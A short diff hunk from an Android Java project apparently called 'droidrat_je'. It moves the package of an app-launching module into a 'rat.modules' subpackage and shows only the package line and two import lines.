@@ -1,4 +1,4 @@
-package com.je_chen.droidrat_je.modules.appintent.runapp;
+package com.je_chen.droidrat_je.rat.modules.appintent.runapp;
 
 import android.content.Context;
 import android.content.Intent;
